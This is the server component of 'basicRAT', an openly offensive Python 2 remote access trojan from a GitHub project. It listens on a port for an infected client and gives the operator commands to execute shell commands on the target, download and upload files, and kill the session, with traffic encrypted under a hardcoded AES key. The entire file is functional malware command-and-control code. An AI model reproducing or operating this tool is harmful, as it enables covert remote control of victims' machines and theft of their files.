#!/usr/bin/env python
# -*- coding: utf-8 -*-

import readline
import socket
import sys
import time

from Crypto import Random
from Crypto.Cipher import AES


# ascii banner (Crawford2) - http://patorjk.com/software/taag/
# ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
BANNER = '''
 ____    ____  _____ ____   __  ____    ____  ______      .  ,
|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
         https://github.com/vesche/basicRAT
'''
HELP_TEXT = '''
download <file> - Download a file.
help            - Show this help menu.
run <command>   - Execute a command on the target.
upload <file>   - Upload a file.
quit            - Gracefully kill client and server.
'''
HOST = 'localhost'
KEY  = '82e672ae054aa4de6f042c888111686a'
# generate your own key with...
# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"


def pad(s):
    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)


def encrypt(plaintext):
    plaintext = pad(plaintext)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)


def decrypt(ciphertext):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.bind((HOST, PORT))
    except socket.error:
        print 'Error: Unable to start server, port {} in use?'.format(PORT)
        sys.exit(1)

    for line in BANNER.split('\n'):
        time.sleep(0.05)
        print line

    print 'basicRAT server listening on port {}...\n'.format(PORT)

    s.listen(10)
    conn, _ = s.accept()

    while True:
        prompt = raw_input('basicRAT> ').rstrip().split()

        # allow noop
        if prompt == []:
            continue

        # seperate prompt into command and action
        cmd, action = prompt[0], ' '.join(prompt[1:])

        # allow no action
        if action == []:
            action = ''

        # send data to client
        data = '{} {}'.format(cmd, action).rstrip()
        conn.send(encrypt(data))

        # stop server
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        # display help text
        elif cmd == 'help':
            print HELP_TEXT

        # results of command
        elif cmd == 'run':
            recv_data = conn.recv(4096)
            print decrypt(recv_data)

        # download a file
        elif cmd == 'download':
            f_name = action.split()[0]

            with open(f_name, 'wb') as f:
                while True:
                    recv_data = conn.recv(1024)
                    if not recv_data:
                        break
                    f.write(decrypt(recv_data))


if __name__ == '__main__':
    try:
        PORT = int(sys.argv[1])
    except (IndexError, ValueError):
        print 'Usage: ./basicRAT_server.py <port>'
        sys.exit(1)

    main()
